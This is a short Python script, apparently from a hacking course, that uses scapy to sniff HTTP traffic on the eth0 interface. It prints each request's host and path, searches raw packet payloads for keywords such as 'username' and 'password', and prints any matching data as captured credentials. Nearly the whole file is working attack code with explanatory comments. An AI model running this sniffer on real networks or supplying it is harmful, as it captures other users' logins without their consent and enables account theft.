#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


# Capture and filter data
# Scapy has a sniffer function called sniff() w/ a parameter called iface
# can call a function specified in prn on each packet
# ex: scapy.sniff(iface=[interface], prn=[call back function])
def sniff_packets(interface):
    # sniff() sniff data that flowing in the interface/ store: storing data in memory to false
    # prn call back function
    # filter will allow you to choose to capture various data like ARP packets, udp packets, tcp and even certain ports
    scapy.sniff(iface=interface, store=False, prn=process_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keyword_list = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keyword_list:
            if keyword in load:
                return load


def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST FOUND >> " + url)
        credentials = get_credentials(packet)
        if credentials:
            print('\n\n[+]Possible username/password identified >' + credentials + "\n\n")


sniff_packets('eth0')
